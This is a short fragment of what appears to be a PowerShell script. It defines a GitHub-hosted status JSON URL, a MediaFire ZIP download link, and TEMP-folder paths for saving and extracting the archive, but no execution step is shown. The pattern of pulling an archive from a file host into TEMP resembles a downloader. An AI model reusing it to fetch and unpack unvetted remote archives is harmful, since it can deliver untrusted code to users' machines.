...
$statusUrl = 'https://api.github.com/repos/bastisayes/Botbastisssprograma/contents/subirj_status/GJPUN54Q.json?ref=main'
...
$zipUrl = 'https://www.mediafire.com/file/h5cvd98n5xitba1/1888932_5557770133008488072.zip/file'
$tempZip = "$env:TEMP\g_1888932.zip"
$extractPath = "$env:TEMP\g_1888932_extract"
